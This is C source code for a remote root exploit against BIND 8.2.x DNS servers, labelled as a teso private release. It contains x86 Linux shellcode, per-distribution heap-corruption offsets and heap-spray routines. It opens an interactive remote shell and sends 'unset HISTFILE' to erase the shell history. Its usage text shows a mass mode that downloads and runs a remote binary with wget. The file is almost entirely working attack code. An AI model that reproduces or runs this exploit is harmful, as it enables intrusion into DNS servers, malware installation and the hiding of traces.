/* coded by smiler / teso
 *
 * teso private release - do not distribute
 *
 * based on scut's method
 *
 * 0.2 added palmers slack 7.1 offsets
 * 0.3 added scut's huge collection of offsets :)
 * 0.4 added populator reliability -sc. :)
 *
 * feedback welcome, im sure there is a better way to do it than this.
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <fcntl.h>
#include <unistd.h>
#if !defined(__FreeBSD__)
#  include <getopt.h>
#endif
#include "dnslib.h"


unsigned char	xp_initstr[] = "unset HISTFILE;uname -a;id;\n";

unsigned char trap_code[] = "\x06\x31\xc0\xfe\xc0\xcd\x80";

/* peername code that checks the source port connecting
 * also setsockopts the SO_RCVLOWAT value in case BIND is
 * waiting for such, which can happen
 */
unsigned char peername_code[]=
	"\x31\xdb\xb3\x07\x89\xe2\xeb\x09\xaa\xaa\xaa\xaa"
	"\xaa\xaa\xaa\xaa\xaa\x6a\x10\x89\xe1\x51\x52\x68"
	"\xfe\x00\x00\x00\x89\xe1\x31\xc0\xb0\x66\xcd\x80"
	"\xa8\xff\x75\x09\x66\x81\x7c\x24\x12\x34\x52\x74"
	"\x0c\x5a\xf6\xc2\xff\x74\x4f\xfe\xca\x52\xeb\xe2"
	"\x38\x5b\x31\xc9\xb1\x03\xfe\xc9\x31\xc0\xb0\x3f"
	"\xcd\x80\x67\xe3\x02\xeb\xf3\x6a\x04\x6a\x00\x6a"
	"\x12\x6a\x01\x53\xb8\x66\x00\x00\x00\xbb\x0e\x00"
	"\x00\x00\x89\xe1\xcd\x80\x6a\x00\x6a\x00\x68\x2f"
	"\x73\x68\x00\x68\x2f\x62\x69\x6e\x8d\x4c\x24\x08"
	"\x8d\x54\x24\x0c\x89\x21\x89\xe3\x31\xc0\xb0\x0b"
	"\xcd\x80\x31\xc0\xfe\xc0\xcd\x80";


/* 34 byte x86/linux PIC arbitrary execute shellcode
 */
unsigned char	x86_lnx_execve[] =
	"\xeb\x1b\x5f\x31\xc0\x50\x8a\x07\x47\x57\xae\x75"
	"\xfd\x88\x67\xff\x48\x75\xf6\x5b\x53\x50\x5a\x89"
	"\xe1\xb0\x0b\xcd\x80\xe8\xe0\xff\xff\xff";

typedef struct target {
	char	*name;
	char	*verstr;
	int	nl;
	unsigned int ret_addr;
	unsigned int retloc;
} target_t;

/* everything from 8.2 (included) to 8.2.3-REL (excluded) is vulnerable
 */
target_t	targets[]={
	/* XXX: i (scut) think that retloc is always right, just retaddr
	 *      can vary. i guess it varies when using different configurations
	 *      so a way to reduce the effect is to send lots of tcp packets
	 *      with nops + shellcode and then use a retaddr above the one
	 *      returned by smilers script. like you send 10 * 64kb packets,
	 *      just use 0x081n0000, n = [567]
	 *
	 * get the offsets this way:
	 * strings /usr/sbin/named | grep 8.2 | tail -1
	 * md5sum /usr/sbin/named
	 * objdump --dynamic-reloc /usr/sbin/named | grep " close$"
	 * retaddr should be 0x08180000 in all cases
	 */

	/* bind-8.2.2p5-7.deb, /usr/sbin/named 1ab35b7360bab29809706c2b440fc147 */
	{"Debian 2.2 8.2.2p5-7 GOT", "8.2.2-P5-NOESW", 0, 0x08180000, 0x080b6d50 },
	/* bind-8.2.2p5-11.deb, /usr/sbin/named bf5bf8aa378bbb135833f3d924746574 */
	{"Debian 2.2 8.2.2p5-11 GOT", "8.2.2-P5-NOESW", 0, 0x08180000, 0x080b6f50 },
	/* bind-8.2.2p7-1.deb, /usr/sbin/named fddc29d50b773125302013cea4fe86cf */
	{"Debian 2.2 8.2.2p7-1 GOT", "8.2.2-P7-NOESW", 1, 0x08180000, 0x080b70b0 },

	/* bind-8.2.2P5-12mdk.i586.rpm, /usr/sbin/named 96cb52c21f622d47315739ee4c480206 */
	{"Mandrake 7.2 8.2.2-P5 GOT", "8.2.2-P5", 1, 0x08180000, 0x080d6a6c },

	/* RedHat 5.2 uses 8.1.2 */
	/* bind-8.2-6.i386.rpm, /usr/sbin/named */
	{"RedHat 6.0 8.2 GOT", "8.2", 0, 0x08180000, 0x080c62ac },
	/* bind-8.2.1-7.i386.rpm, /usr/sbin/named 9e1efa3d6eb65d1d12e9c3afcb1679de */
	{"RedHat 6.1 8.2.1 GOT", "8.2.1", 0, 0x08180000, 0x080c3a2c },
	/* bind-8.2.2_P3*?.rpm, /usr/sbin/named 40ae845243a678a5762a464f08a67ab5 */
	{"RedHat 6.2 8.2.2-P3 GOT", "8.2.2-P3", 0, 0x08180000, 0x080c5170 },
	/* bind-8.2.2_P5-9.rpm, /usr/sbin/named a74c76eca6d2bd6ad20a8258e6ba0562 */
	{"RedHat 6.2 8.2.2-P5 GOT", "8.2.2-P5", 0, 0x08180000, 0x080c56ac },
	/* bind-8.2.2_P5-25.i386.rpm, /usr/sbin/named ef247e20848ac07a3c5dde1d18d5e201 */
	{"RedHat 7.0 8.2.2-P5 GOT", "8.2.2-P5", 1, 0x08180000, 0x080f7230 },

	/* SuSE 6.0 to 6.2 use BIND 8.1.2 */
	/* bind8.rpm, /usr/sbin/named 4afe958a1959918426572701dd650c4b */
	{"SuSE 6.3 8.2.2-P5 GOT", "8.2.2-P5", 0, 0x08180000, 0x080d1d8c },
	/* bind8.rpm, /usr/sbin/named b8f62f57b9140e7c9a6abb12b8cb9751 */
	{"SuSE 6.4 8.2.2-P5 GOT", "8.2.2-P5", 0, 0x08180000, 0x080d0a8c },
	/* bind8.rpm, /usr/sbin/named 4aa979a93e5e8b44d316a986d3008931 */
	{"SuSE 7.0 8.2.3-T5B GOT", "8.2.3-T5B", 0, 0x08180000, 0x080d36cc },
	{"SuSE 7.1 8.2.3-T9B GOT", "8.2.3-T9B", 1, 0x08180000, 0x080d5ca8 },

	/* slack 4.0 uses 8.1.2 */
	/* bind.tgz, /usr/sbin/named 6a2305085f8a3e50604c32337d354ff8 */
	{"Slackware 7.0 8.2.2-REL GOT", "8.2.2-REL", 0, 0x08180000, 0x080c532c },
	/* bind.tgz, /usr/sbin/named 1c7436aaab660c3c1c940e4e9c6847ec */
	{"Slackware 7.1 8.2.2-P5 GOT", "8.2.2-P5", 1, 0x08180000, 0x080bfd0c },

	{NULL, 0x0, 0x0 },
};

int		mass = 0,
		check_version = 1;
unsigned char *	code = peername_code;
unsigned int	code_len = sizeof (peername_code);

int
sleepvis (int seconds);

void
bind_version (struct addrinfo *addr, unsigned char *verbuf,
	unsigned long int len);

static int	sc_build_x86_lnx (unsigned char *target, size_t target_len,
	unsigned char *shellcode, char **argv);

int
send_bogus (struct addrinfo *addr);

int
send_populators (struct addrinfo *addr, int count);

int		target_cnt = sizeof(targets)/sizeof(target_t);
target_t	*vec = &targets[0];

#if 1
int
Xsend (int fd, unsigned char *buf, size_t len, int flags)
{
	int	n, tot = len;

	while (len > 0) {
		n = send (fd, buf, len, flags);
		if (n <= 0)
			return (n);
		len -= n;
		buf += n;
	}

	return (tot);
}
#else
#define Xsend send
#endif

#if 1
int
Xread (int fd, unsigned char *buf, size_t len)
{
	int		n, tot;
	int		pdlen;
	unsigned char	plen[2];

	read (fd, plen, 2);
	pdlen = ntohs (*(u_int16_t *)plen);
	if (pdlen > len)
		return (-1);

	len = pdlen;
	tot = len;

	while (len > 0) {
		n = read (fd, buf, len);
		if (n < 0)
			return (n);

		len -= n;
		if (n == 0)
			return (len);
		buf += n;
	}

	return (tot);
}
#else
#define	Xread read
#endif


void
runshell (int fd)
{
	fd_set  rset;
	int     n;
	char    buffer[4096];

	for (;;) {
		FD_ZERO (&rset);
		FD_SET (fd, &rset);
		FD_SET (STDIN_FILENO, &rset);

		n = select (fd + 1, &rset, NULL, NULL, NULL);
		if (n <= 0) {
			perror ("select");
			return;
		}

		if (FD_ISSET (fd, &rset)) {
			n = recv (fd, buffer, sizeof (buffer), 0);
			if (n <= 0) {
				perror ("select");
				break;
			}

			write (STDOUT_FILENO, buffer, n);
		}

		if (FD_ISSET (STDIN_FILENO, &rset)) {
			n = read (STDIN_FILENO, buffer, sizeof (buffer));
			if (n <= 0) {
				perror ("select");
				break;
			}
			Xsend (fd, buffer, n, 0);
		}
	}
	return;
}

int
get_warez_connection (struct addrinfo *addr)
{
	int	s, val = 1;
	struct sockaddr_in sin;

	s = socket (addr->ai_family, addr->ai_socktype, addr->ai_protocol);
	if (s < 0) {
		return (-1);
	}

	if (setsockopt (s, SOL_SOCKET, SO_REUSEADDR, &val, sizeof(val)) < 0) {
		close (s);
		return (-1);
	}

	memset (&sin, 0, sizeof(sin));
	sin.sin_family = addr->ai_family;
	sin.sin_port = htons (13394); /* shellcode checks for this... */
	sin.sin_addr.s_addr = 0;

	if (bind (s, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
		close (s);
		return (-1);
	}

	if (connect (s, addr->ai_addr, addr->ai_addrlen) < 0) {
		close (s);
		return (-1);
	}

	return (s);
}

int
get_connection (struct addrinfo *addr)
{
	int	s;

	s = socket (addr->ai_family, addr->ai_socktype, addr->ai_protocol);
	if (s < 0) {
		return (-1);
	}

	if (connect (s, addr->ai_addr, addr->ai_addrlen) < 0) {
		close (s);
		return (-1);
	}

	fcntl (s, F_SETFL, O_SYNC | fcntl (s, F_GETFL));

	return (s);
}

/* since a malloc packet is always aligned on an 8 byte boundary we can 
 * assume at least a 2 byte alignment.
 * Since (ret+12) is overwritten with garbage we need to jump over that
 * with each instruction and it also needs to look like a domain name.
 */
unsigned char tesops[]=
	"\x27\x90\xeb\x12\xeb\x12\xeb\x12\xeb\x12"
	"\xeb\x12\xeb\x12\xeb\x12\xeb\x12\xeb\x12"
	"\xeb\x12\xeb\x12\xeb\x12\xeb\x12\xeb\x12"
	"\xeb\x12\xeb\x12\xeb\x12\xeb\x12\xeb\x12";
/* just nops plus a jump to skip the first byte of the shellcode, note
 * we shouldn't return into this part, but its relatively small
 */
unsigned char finops[]=
	"\x14\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x01";

int
mk_nops (unsigned char *cp)
{
	unsigned char *orig = cp;
	int	ctr;

	for (ctr = 0; ctr < 1498; ++ctr) {
		memcpy (cp, tesops, 40);
		cp += 40;
	}
	memcpy (cp, finops, 21);
	cp += 21;
	return (cp - orig);	
}
int
mk_overwrite_pkt (unsigned char *cp)
{
	unsigned char *orig = cp;
	HEADER *hdr = (HEADER *)cp;

	memset (cp, 0, NS_HFIXEDSZ);
	hdr->id = 0;
	hdr->rd = 1;
	hdr->arcount = hdr->qdcount = htons (1);

	cp += NS_HFIXEDSZ;

	cp += mk_nops (cp);

#if 0
	memcpy (cp, vec->code, vec->code_len);
	cp += vec->code_len;
#endif

#if 1
	cp += dns_mklongdn (cp, 0xffff - 25 - (cp - orig));
#else /* harmless, for testing... */
	cp += dns_mklongdn (cp, 0xffff - 25 - (cp - orig) - 40);
#endif
	*cp++ = '\0';

	NS_PUT16 (ns_t_a, cp);
	NS_PUT16 (ns_c_in, cp);

	*cp++ = '\0';
	NS_PUT16 (250, cp);
	*cp++ = '\0';

	return (cp - orig);
}

int
mk_malloc_pkt (unsigned char *cp)
{
	unsigned char *orig = cp;

	memset (cp, 'P', 0x10 - 8);
	cp += 0x10 - 8;

	/* fake 1 indicate previous is in use */
	NS_LPUT32 (0, cp);
	NS_LPUT32 (0x11, cp);
	NS_LPUT32 (vec->retloc - 12, cp);
	NS_LPUT32 (vec->ret_addr, cp);
	/* fake 2 indicate previous isnt in use */
	NS_LPUT32 (0x10, cp);
	NS_LPUT32 (0x10, cp);
	NS_LPUT32 (0xf4f4f4f4, cp);
	NS_LPUT32 (0x4f4f4f4f, cp);
	/* fake 3 indicate previous is in use */
	NS_LPUT32 (0x0, cp);
	NS_LPUT32 (0x11, cp);
	NS_LPUT32 (0xe3e3e3e3, cp);
	NS_LPUT32 (0x3e3e3e3e, cp);

	return (cp - orig);
}

int
sleepvis (int seconds)
{
	fprintf (stderr, "%2d", seconds);
	while (seconds > 0) {
		fflush (stderr);
		seconds -= 1;
		sleep (1);
		fprintf (stderr, "\b\b%2d", seconds);
	}
	fprintf (stderr, "\b\b");
	fflush (stderr);

	return (0);
}

int
send_bogus (struct addrinfo *addr)
{
	int		sock;
	unsigned char	bogus[2] = "\x00\x00";

	sleep (10);

	sock = get_connection (addr);
	if (sock < 0) {
		fprintf (stderr, "# looks alright, BIND either crashed or spinning in shellcode\n");
		return (1);
	} else {
		fprintf (stderr, "# BIND is still reacting, either not vulnerable or GOT not triggered\n");
		fprintf (stderr, "# triggering close()\n");
	}

	if (Xsend (sock, bogus, 2, 0) < 0) {
		perror ("send_bogus:send");
		exit (EXIT_FAILURE);
	}
	close (sock);

	return (0);
}

int
send_populators (struct addrinfo *addr, int count)
{
	int		i;
	int		sock[64];
	unsigned char	len[2];
	unsigned char	dbuf[65536];
	unsigned int	dbuf_len_tell = 65532;
	unsigned int	dbuf_len_send;

	if (count > (sizeof (sock) / sizeof (sock[0]))) {
		fprintf (stderr, "to keep the balance of sanity is sometimes impossible\n");
		exit (EXIT_FAILURE);
	}

	fprintf (stderr, "sending %d packets, 64kb each. will give %lu bytes of nop space\n",
		count, (unsigned long int) count * (dbuf_len_tell - code_len));
	fprintf (stderr, "for each packet we will leave one socket open\n");
	fprintf (stderr, "[");
	fflush (stderr);

	/* build buffer: <jmp-nops> <shellcode> <remspace>
	 * cant be simpler ;)
	 * remspace is not send to the remote side at all
	 */
	dbuf_len_send = dbuf_len_tell - 64;
	for (i = 0 ; i < (dbuf_len_send - code_len) ; i += 2) {
		dbuf[i] = '\xeb';
		dbuf[i + 1] = '\x12';
	}
	for (i = (dbuf_len_send - code_len - 0x20) ;
		i < (dbuf_len_send - code_len) ; ++i)
	{
		dbuf[i] = '\x90';
//		dbuf[i] = '\xcc';
	}
	memcpy (dbuf + dbuf_len_send - code_len,
		code, code_len);

	for (i = 0 ; i < count ; ++i) {
		fprintf (stderr, "%1d", i % 10);
		fflush (stderr);

		sock[i] = get_connection (addr);
		if (sock[i] < 0)
			continue;

		*(u_int16_t *)len = htons (dbuf_len_tell);
		if (Xsend (sock[i], len, 2, 0) < 0) {
			perror ("send_populators:len-sending:send");
			exit (EXIT_FAILURE);
		}
		if (Xsend (sock[i], dbuf, dbuf_len_send, 0) < 0) {
			perror ("send_populators:dbuf-sending:send");
			exit (EXIT_FAILURE);
		}
	}

	fprintf (stderr, "]\n\n");
	fprintf (stderr, "successfully set up populator traps\n");

	return (0);
}


int
send_expl (struct addrinfo *addr)
{
	int	s1 = -1, s2 = -1, s3 = -1, s4 = -1, err = 0;
	int	owrite_len, mallox_len, blue =0;
	unsigned char owrite[65536], len[2];
	unsigned char mallox[0x2000];

	/* create the packets first */
	owrite_len = mk_overwrite_pkt (owrite);
	if (owrite_len > 65535) {
		fprintf (stderr, "fuck..\n");
		return (-1);
	}

	mallox_len = mk_malloc_pkt (mallox);

	s1 = get_connection (addr);
	s2 = get_connection (addr);
	s3 = get_connection (addr);
	if (s1 < 0 || s2 < 0 || s3 < 0) {
		perror ("get_connection");
		goto fail;
	}

	/* make named allocate the packet data */
	*(u_int16_t *)len = htons (0x60);
	if (Xsend (s1, len, 2, 0) < 0) {
		perror ("send");
		goto fail;
	}

	*(u_int16_t *)len = htons (owrite_len);
	if (Xsend (s2, len, 2, 0) < 0) {
		perror ("send");
		goto fail;
	}

	/* server still expects more.. */
	*(u_int16_t *)len = htons (mallox_len + 1);
	if (Xsend (s3, len, 2, 0) < 2) {
		perror ("send");
		goto fail;
	}

	printf ("sending main part of malloc packet...\n");
	if (Xsend (s3, mallox, mallox_len, 0) < (mallox_len)) {
		perror ("malloc send");
		goto fail;
	}

	sleepvis (5);

	printf ("sending overwrite packet...\n");
	/* overwrite the 3rd packet with the 2nd */
	if (Xsend (s2, owrite, owrite_len, 0) < owrite_len) {
		perror ("owrite_send");
		goto fail;
	}
	while (blue < 65300) {
		int	n;

		n = recv (s2, owrite, sizeof(owrite), 0);
		if (n <= 0)
			break;
		blue += n;
	}

	close (s2);
	s4 = get_warez_connection (addr);
	if (s4 < 0) {
		perror ("get_warez_connection");
		return (-1);
	}
	fprintf (stderr, "sent overwrite packet...sleeping for 2 seconds\n");
	sleepvis (2);

	/* experimental reliability patch */
	fprintf (stderr, "sending dummy packets with shellcode to populate the heap\n");
	send_populators (addr, 20);
	sleepvis (5);

	fprintf (stderr, "freeing packet\n");
	/* free the 3rd packet */
	if (Xsend (s3, "a",1,0) < 1) {
		perror ("malloc 2 send");
		goto fail;
	}
	close(s3);
	sleepvis (2);
	fprintf (stderr, "doing close\n");
	send (s1, mallox, 0x60, 0);
	close (s1);
	sleepvis (2);
	fprintf (stderr, "doing fork-away and bogus connect to trigger close...\n");
	if (fork () == 0) {
		send_bogus (addr);
		exit (EXIT_SUCCESS);
	}

	if (mass == 1) {
		sleepvis (5);
		fprintf (stderr, "egg placed, may the force be with you.\n");
		exit (EXIT_SUCCESS);
	}

	fprintf (stderr, "trying shell....\n");
	fprintf (stderr, "advice: be patient, if it does not seem react here, wait. BIND may be in\n");
	fprintf (stderr, "        an unstable state, but we will send a bogus packet in 10 seconds.\n");
	fprintf (stderr, "        if it does react after some minutes, but behaves blocky,\n");
	fprintf (stderr, "        something went wrong, but you can still type blind and wait a\n");
	fprintf (stderr, "        few minutes for it to react, sorry.\n");
	fprintf (stderr, "-------------------------------------------------------------------------\n");

#ifndef TRUST_THE_MAGIC
	write (s4, xp_initstr, strlen (xp_initstr));
#endif
	runshell (s4);

	err++;
fail:
	err--;
	close (s1);
	close (s2);
	close (s3);
	return (err);
}

int
send_exploit (char *hname)
{
	struct addrinfo *addr, hints;
	int err = 0; 

	memset (&hints, 0, sizeof(hints));
	hints.ai_flags = AI_CANONNAME;
	hints.ai_family = PF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	err = getaddrinfo (hname, "domain", &hints, &addr);
	if (err) {
		fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (err));
		return (-1);
	}

	if (check_version) {
		unsigned char	verbuf[64];

		fprintf (stderr, "probing for BIND version %s\n", vec->verstr);
		memset (verbuf, '\0', sizeof (verbuf));
		bind_version (addr, verbuf, sizeof (verbuf));
		verbuf[sizeof (verbuf) - 1] = '\0';
		if (strcmp (verbuf, vec->verstr) != 0) {
			fprintf (stderr, "remote uses BIND version \"%s\",\n"
				"while the vector is for BIND version \"%s\".\n"
				"use -n option to override, but know what you do\n",
				verbuf, vec->verstr);

			exit (EXIT_FAILURE);
		}
		fprintf (stderr, "remote uses correct version: \"%s\"\n", verbuf);
	}


	err = send_expl (addr);

	freeaddrinfo (addr);

	return (err);
}

void
usage (char *prg)
{
	fprintf (stderr, "usage: %s [-h ip] [-t target] [mass commands]\n\n", prg);
	fprintf (stderr, "-c           mass mode. experts only\n");
	fprintf (stderr, "-n           do NOT check for the correct BIND version\n");
	fprintf (stderr, "-h ip        set target ip (default: 127.0.0.1)\n");
	fprintf (stderr, "-t target    set target, zero gives a list\n\n");

	fprintf (stderr, "example: %s -h 127.0.0.1 -t 4 -c -- /bin/sh -c \\\n"
		"\t\"cd /tmp;wget foo.org/bar;chmod +x bar;./bar\"\n\n", prg);

	exit (EXIT_FAILURE);
}

int
main (int argc, char **argv)
{
	char c;
	char * dest = "127.0.0.1";
	int target = 0;
	unsigned char	codebuf[256];

	if (argc == 1)
		usage (argv[0]);

	while ((c = getopt (argc, argv, "cnh:t:")) != EOF) {
		switch (c) {
		case 'c':
			mass = 1;
			break;
		case 'n':
			check_version = 0;
			break;
		case 'h':
			dest = optarg;
			break;
		case 't':
			if (atoi (optarg) == 0) {
				target_t *ptr;
				int ctr;

				printf ("\tno   system                          BIND version\n");
				printf ("\t---  ------------------------------  ---------------\n");
				for (ctr = 1, ptr = targets; ptr->name; ++ptr, ++ctr)
					fprintf (stderr, "\t%2d:  %-30s  %-15s\n%s", ctr,
						ptr->name, ptr->verstr,
						ptr->nl == 1 ? "\n" : "");
				exit (EXIT_FAILURE);
			}
			target = atoi (optarg);

			break;
		default:
			usage (argv[0]);
			break;
		}
	}

	/* one remaining argument (script file name)
	 */
	if (mass == 1 && (argc - optind) == 0)
		usage (argv[0]);

	if (mass == 1) {
		int	len;

		len = sc_build_x86_lnx (codebuf, sizeof (codebuf),
			x86_lnx_execve, &argv[optind]);

		fprintf (stderr, "created %d byte execve shellcode\n", len);

		code = codebuf;
		code_len = len;
	}

	target -= 1;
	if (target >= target_cnt)
		target = 0;
	vec = &targets[target];

	fprintf (stderr, "using: %s\n", vec->name);
	fprintf (stderr, "against: %s\n", dest);
	fprintf (stderr, "\n");

	srand (time (NULL));

	send_exploit (dest);

	return (EXIT_SUCCESS);
}


void
bind_version (struct addrinfo *addr, unsigned char *verbuf,
	unsigned long int verlen)
{
	int			s1;
	unsigned char		pkt[] =
		"\x00\x06\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
		"\x07\x76\x65\x72\x73\x69\x6f\x6e\x04\x62\x69\x6e"
		"\x64\x00\x00\x10\x00\x03";
	unsigned char *		ver;
	unsigned char		resp[256];
	unsigned char		len[2];

	s1 = get_connection (addr);
	if (s1 < 0) {
		perror ("bind_version:connect");
		exit (EXIT_FAILURE);
	}

	*(u_int16_t *)len = htons (30);
	if (Xsend (s1, len, 2, 0) < 0) {
		perror ("bind_version:send-len");
		exit (EXIT_FAILURE);
	}

	if (Xsend (s1, pkt, 30, 0) < 30) {
		perror ("bind_version:send-data");
		exit (EXIT_FAILURE);
	}

	memset (resp, '\0', sizeof (resp));
	if (Xread (s1, resp, sizeof (resp) - 1) < 0) {
		perror ("bind_version:read-data");
		exit (EXIT_FAILURE);
	}

	ver = resp + sizeof (resp) - 1;
	while (ver > resp && *ver == '\0')
		--ver;
	while (ver > resp && isprint (*ver) && *ver >= 0x20)
		--ver;
	if (*ver < 0x20)
		++ver;
	strncpy (verbuf, ver, verlen);

	close (s1);
}


static int
sc_build_x86_lnx (unsigned char *target, size_t target_len, unsigned char *shellcode,
	char **argv)
{
	int	i;
	size_t	tl_orig = target_len;


	if (strlen (shellcode) >= (target_len - 1))
		return (-1);

	memcpy (target, shellcode, strlen (shellcode));
	target += strlen (shellcode);
	target_len -= strlen (shellcode);

	for (i = 0 ; argv[i] != NULL ; ++i)
		;

	/* set argument count
	 */
	target[0] = (unsigned char) i;
	target++;
	target_len--;

	for ( ; i > 0 ; ) {
		i -= 1;

		if (strlen (argv[i]) >= target_len)
			return (-1);

		printf ("[%3d/%3d] adding (%2d): %s\n",
			(tl_orig - target_len), tl_orig,
			strlen (argv[i]), argv[i]);

		memcpy (target, argv[i], strlen (argv[i]));
		target += strlen (argv[i]);
		target_len -= strlen (argv[i]);

		target[0] = (unsigned char) (i + 1);
		target++;
		target_len -= 1;
	}

	return (tl_orig - target_len);
}
